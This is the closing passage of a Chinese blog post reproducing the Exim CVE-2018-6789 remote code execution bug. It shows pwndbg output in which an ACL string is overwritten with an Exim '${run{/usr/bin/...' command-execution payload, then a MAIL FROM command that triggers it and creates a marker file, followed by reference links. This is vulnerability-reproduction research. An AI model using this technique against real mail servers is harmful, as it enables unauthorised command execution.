<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#b64decode的store_get_3返回：</span></span><br><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            <span class="number">0x1a3e4a0</span>	<span class="number">27518112</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x1a3e4a0</span>+<span class="number">0x80</span></span><br><span class="line"><span class="number">0x1a3e520</span>:	<span class="string">"acl_check_mail"</span></span><br><span class="line">pwndbg&gt; finish</span><br><span class="line"><span class="comment">#finish b64decode</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x1a3e4a0</span>+<span class="number">0x80</span></span><br><span class="line"><span class="number">0x1a3e520</span>:	<span class="string">"$&#123;run&#123;/usr/bin/"</span>...</span><br></pre></td></tr></table></figure>
<h2 id="Step-10"><a href="#Step-10" class="headerlink" title="Step 10"></a>Step 10</h2><p>MAIL FROM命令触发acl_check。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$ ls -al|grep success</span><br><span class="line">-rw-------  <span class="number">1</span> test test     <span class="number">0</span> Feb <span class="number">15</span> <span class="number">01</span>:<span class="number">13</span> success</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到难懂的问题，可以先去源码里找答案，再搞不懂的，就gdb调起来。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/" target="_blank" rel="noopener">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a></p>
<p><a href="http://blog.leanote.com/post/mut3p1g/exim-CVE-2018-6789-%E5%88%86%E6%9E%90-2" target="_blank" rel="noopener">http://blog.leanote.com/post/mut3p1g/exim-CVE-2018-6789-%E5%88%86%E6%9E%90-2</a></p>
<p><a href="https://bbs.pediy.com/thread-225986.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225986.htm</a></p>
<p><a href="https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789</a></p>
<p><a href="https://0x48.pw/2018/03/30/0x42/" target="_blank" rel="noopener">https://0x48.pw/2018/03/30/0x42/</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/" rel="next" title="CVE-2010-3333栈溢出漏洞复现新手向">
                <i class="fa fa-chevron-left"></i> CVE-2010-3333栈溢出漏洞复现新手向
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/05/19/路由器漏洞复现0：环境搭建/" rel="prev" title="路由器漏洞复现0：环境搭建">
                路由器漏洞复现0：环境搭建 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/uploads/avatar.jpg"
                alt="0gur1" />
            
              <p class="site-author-name" itemprop="name">0gur1</p>
              <p class="site-description motion-element" itemprop="description">Stay hungry.Stay foolish.</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">27</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞原理"><span class="nav-number">1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exim的内存管理"><span class="nav-number">2.</span> <span class="nav-text">Exim的内存管理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#总述"><span class="nav-number">2.1.</span> <span class="nav-text">总述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#store-get-3函数"><span class="nav-number">2.2.</span> <span class="nav-text">store_get_3函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#store-free-3函数"><span class="nav-number">2.3.</span> <span class="nav-text">store_free_3函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#store-malloc-3函数"><span class="nav-number">2.4.</span> <span class="nav-text">store_malloc_3函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#store-reset-3函数"><span class="nav-number">2.5.</span> <span class="nav-text">store_reset_3函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exim中调用内存管理的关键函数"><span class="nav-number">3.</span> <span class="nav-text">Exim中调用内存管理的关键函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#smtp-reset函数"><span class="nav-number">3.1.</span> <span class="nav-text">smtp_reset函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#check-helo函数"><span class="nav-number">3.2.</span> <span class="nav-text">check_helo函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#synprot-error函数处理unknown-cmd"><span class="nav-number">3.3.</span> <span class="nav-text">synprot_error函数处理unknown cmd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#auth-cram-md5-server"><span class="nav-number">3.4.</span> <span class="nav-text">auth_cram_md5_server</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">4.1.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用思路"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞利用思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境配置"><span class="nav-number">5.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现过程"><span class="nav-number">6.</span> <span class="nav-text">复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-1"><span class="nav-number">6.1.</span> <span class="nav-text">Step 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-2"><span class="nav-number">6.2.</span> <span class="nav-text">Step 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-3"><span class="nav-number">6.3.</span> <span class="nav-text">Step 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-4"><span class="nav-number">6.4.</span> <span class="nav-text">Step 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-5"><span class="nav-number">6.5.</span> <span class="nav-text">Step 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-6"><span class="nav-number">6.6.</span> <span class="nav-text">Step 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-7"><span class="nav-number">6.7.</span> <span class="nav-text">Step 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-8"><span class="nav-number">6.8.</span> <span class="nav-text">Step 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-9"><span class="nav-number">6.9.</span> <span class="nav-text">Step 9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-10"><span class="nav-number">6.10.</span> <span class="nav-text">Step 10</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">8.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">0gur1</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>



<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客量:<span id="busuanzi_value_site_uv"></span>
</span>
</div>
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz", "slQuYxW7tjbda9dyxmi3dY4o");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
